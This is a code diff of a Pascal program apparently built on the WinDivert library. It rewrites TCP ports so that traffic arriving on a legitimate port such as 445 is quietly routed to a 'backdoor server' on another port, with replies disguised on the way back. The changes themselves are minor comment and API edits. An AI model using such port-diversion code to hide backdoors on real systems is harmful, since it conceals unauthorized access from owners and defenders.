@@ -60,7 +60,7 @@ while 1=1 do
   end;
 
   pipheader:=@packet[0];
-
+  str_len:=inttostr(ntohs(pipheader^.ip_totallength ));
   str_time:=FormatDateTime('hh:nn:ss:zzz', now);
   str_srcip:=strpas(Inet_Ntoa(TInAddr(pipheader^.ip_srcaddr)));
   str_destip:=strpas(Inet_Ntoa(TInAddr(pipheader^.ip_destaddr)));
@@ -82,22 +82,22 @@ while 1=1 do
       end;
 
       //when traffic from client to backdoor server
-      if dest_port =strtoint(original_port) then
+      if dest_port =strtoint(original_port) then //we could check for the direction as well...
       begin
-      //we need to change that dst port to 1337 ...
+      //we need to change that dst port to diverted port ...
       PTCP_Header(@pipheader^.data)^.dst_portno:=htons(strtoint(new_port));
-      if WinDivertHelperCalcChecksums(@packet[0],packet_len ,0)=0 then writeln('WinDivertHelperCalcChecksums failed, '+inttostr(getlasterror));
+      if WinDivertHelperCalcChecksums(@packet[0],packet_len ,nil,0)=0 then writeln('WinDivertHelperCalcChecksums failed, '+inttostr(getlasterror));
       if WinDivertSend (h,@packet[0],packet_len ,@addr,@written)=false
          then writeln('WinDivertSend failed,'+inttostr(getlasterror));
          //else writeln('WinDivertSend sent to '+str_destip+':'+new_port+','+inttostr(written)+ ' bytes');
       end;
 
       //when traffic from backdoor server to client
-      if src_port =strtoint(new_port ) then
+      if src_port =strtoint(new_port ) then  //we could check for the direction as well...
       begin
-      //we need to change that src port to 445
+      //we need to change that src port to original port
       PTCP_Header(@pipheader^.data)^.src_portno:=htons(strtoint(original_port));
-      if WinDivertHelperCalcChecksums(@packet[0],packet_len ,0)=0 then writeln('WinDivertHelperCalcChecksums failed, '+inttostr(getlasterror));
+      if WinDivertHelperCalcChecksums(@packet[0],packet_len ,nil,0)=0 then writeln('WinDivertHelperCalcChecksums failed, '+inttostr(getlasterror));
       if WinDivertSend (h,@packet[0],packet_len ,@addr,@written)=false
          then writeln('WinDivertSend failed,'+inttostr(getlasterror));
          //else writeln('WinDivertSend sent from '+str_srcip+':'+original_port+','+inttostr(written)+ ' bytes');
